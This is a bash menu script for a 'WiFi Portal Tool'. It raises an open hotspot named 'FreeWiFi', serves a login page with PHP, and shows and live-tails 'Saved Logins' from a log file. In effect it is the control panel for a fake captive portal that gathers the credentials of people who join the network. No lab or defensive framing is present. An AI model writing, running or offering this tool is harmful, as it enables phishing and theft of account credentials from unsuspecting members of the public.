#!/bin/bash

PORTAL_DIR="portal"
LOG_FILE="logs/log.txt"
HOTSPOT_IFACE="wlp4s0"   # Wi-Fi interface
INTERNET_IFACE=""         # leave empty for hotspot-only (no internet)
SSID="FreeWiFi"

# ---------------------------
# Check if hotspot is running
# ---------------------------
is_hotspot_running() {
    pgrep create_ap >/dev/null 2>&1
    return $?
}

# ---------------------------
# Start open hotspot using create_ap
# ---------------------------
start_hotspot() {
    if is_hotspot_running; then
        echo "[!] Hotspot is already running!"
        return
    fi

    echo "[+] Starting open hotspot..."
    # Requires sudo
    sudo create_ap --no-virt "$HOTSPOT_IFACE" "$INTERNET_IFACE" "$SSID" "" &
    sleep 2
    if is_hotspot_running; then
        echo "[+] Open hotspot started successfully!"
    else
        echo "[-] Failed to start hotspot. Check your Wi-Fi interface and driver."
    fi
}

# ---------------------------
# Stop hotspot
# ---------------------------
stop_hotspot() {
    if is_hotspot_running; then
        sudo pkill create_ap
        echo "[+] Hotspot stopped."
    else
        echo "[!] No hotspot is running."
    fi
}

# ---------------------------
# Start login page server
# ---------------------------
start_server() {
    if [ ! -d "$PORTAL_DIR" ]; then
        echo "[-] Portal directory '$PORTAL_DIR' does not exist!"
        return
    fi
    echo "[+] Starting portal server..."
    cd "$PORTAL_DIR" || exit
    php -S 0.0.0.0:8080
}

# ---------------------------
# View saved logins
# ---------------------------
view_logs() {
    echo "---- Saved Logins ----"
    if [ -f "$LOG_FILE" ]; then
        cat "$LOG_FILE"
    else
        echo "No logs yet."
    fi
    echo "----------------------"
}

# ---------------------------
# Live logs
# ---------------------------
live_logs() {
    echo "[+] Live log view (Ctrl+C to exit)"
    if [ ! -f "$LOG_FILE" ]; then
        touch "$LOG_FILE"
    fi
    tail -f "$LOG_FILE"
}

# ---------------------------
# Edit login page
# ---------------------------
edit_page() {
    if [ ! -f "$PORTAL_DIR/index.html" ]; then
        echo "[-] Login page does not exist!"
        return
    fi
    nano "$PORTAL_DIR/index.html"
}

# ---------------------------
# Setup folders/files
# ---------------------------
setup() {
    echo "[+] Setting up folders..."
    mkdir -p "$PORTAL_DIR" logs
    touch "$LOG_FILE"
    chmod 666 "$LOG_FILE"
    echo "[+] Setup complete!"
}

# ---------------------------
# Main Menu
# ---------------------------
while true; do
    echo ""
    echo "====== WiFi Portal Tool ======"
    echo "1) Setup (first time)"
    echo "2) Start Open Hotspot"
    echo "3) Stop Hotspot"
    echo "4) Start Login Page Server"
    echo "5) View Saved Logins"
    echo "6) Live View Logs"
    echo "7) Edit Login Page"
    echo "8) Exit"
    echo "=============================="
    read -p "Select option: " choice

    case $choice in
        1) setup ;;
        2) start_hotspot ;;
        3) stop_hotspot ;;
        4) start_server ;;
        5) view_logs ;;
        6) live_logs ;;
        7) edit_page ;;
        8) echo "Exiting..."; exit ;;
        *) echo "Invalid option" ;;
    esac
done
